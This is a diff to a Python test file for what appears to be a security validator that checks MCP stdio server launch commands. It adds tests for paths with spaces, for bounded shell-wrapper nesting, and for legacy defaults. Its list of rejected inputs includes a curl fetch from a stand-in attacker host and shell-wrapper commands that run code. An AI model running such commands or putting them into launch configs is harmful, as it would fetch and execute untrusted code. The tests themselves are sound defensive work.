@@ -108,6 +108,21 @@ async def test_update_tools_allows_safe_stdio_config():
     )
 
 
+async def test_update_tools_preserves_executable_path_with_spaces():
+    """An executable path remains one argv entry when the command is serialized."""
+    stdio_client = AsyncMock()
+    stdio_client.connect_to_server.return_value = []
+    command = "/opt/Node Tools/node"
+
+    await update_tools(
+        "safe-path",
+        {"mode": "Stdio", "command": command, "args": ["server.js"]},
+        mcp_stdio_client=stdio_client,
+    )
+
+    stdio_client.connect_to_server.assert_awaited_once_with(shlex.join([command, "server.js"]), {})
+
+
 async def test_update_tools_does_not_apply_stdio_policy_to_streamable_http():
     """A safe Streamable HTTP config must remain on the HTTP transport path."""
     stdio_client = AsyncMock()
@@ -182,13 +197,27 @@ async def test_stdio_client_preserves_safe_package_and_provider_credentials():
     assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105
 
 
+async def test_stdio_client_preserves_executable_path_with_spaces():
+    """The immediate pre-spawn gate accepts one quoted executable path and structured args."""
+    client = MCPStdioClient()
+    session = MagicMock()
+    session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
+    client._get_or_create_session = AsyncMock(return_value=session)  # type: ignore[method-assign]
+    command = "/opt/Node Tools/node"
+
+    await client._connect_to_server(shlex.join([command, "server.js"]), None)
+
+    assert client._connection_params.command == command
+    assert client._connection_params.args == ["server.js"]
+
+
 def test_shell_wrapper_nesting_is_bounded():
     payload = "node server.js"
-    for _ in range(MAX_SHELL_WRAPPER_DEPTH + 1):
+    for _ in range(MAX_SHELL_WRAPPER_DEPTH):
         payload = f"sh -c {shlex.quote(payload)}"
 
     with pytest.raises(MCPStdioSecurityError, match="nesting exceeds"):
-        validate_mcp_stdio_config(payload, None, None)
+        validate_mcp_stdio_config("sh", ["-c", payload], None)
 
 
 @pytest.mark.parametrize(
@@ -196,7 +225,7 @@ def test_shell_wrapper_nesting_is_bounded():
     [
         "curl https://attacker.invalid/payload",
         "bash -lc 'python -c pass'",
-        "sh -cnode\\ -e\\ pass",
+        "sh '-cnode -e pass'",
         "cmd /c node -e pass",
     ],
 )
@@ -211,3 +240,16 @@ async def test_legacy_stdio_component_validates_saved_command_before_connecting(
         await component.build_output()
 
     component.client.connect_to_server.assert_not_awaited()
+
+
+async def test_legacy_stdio_component_normalizes_safe_default_before_connecting():
+    """The deprecated packed-string default remains usable through the shared policy."""
+    component = MCPStdio()
+    component.command = "uvx mcp-sse-shim"
+    component.client = AsyncMock()
+    component.client.session = None
+    component.client.connect_to_server.return_value = []
+
+    assert await component.build_output() == []
+
+    component.client.connect_to_server.assert_awaited_once_with("uvx mcp-sse-shim")
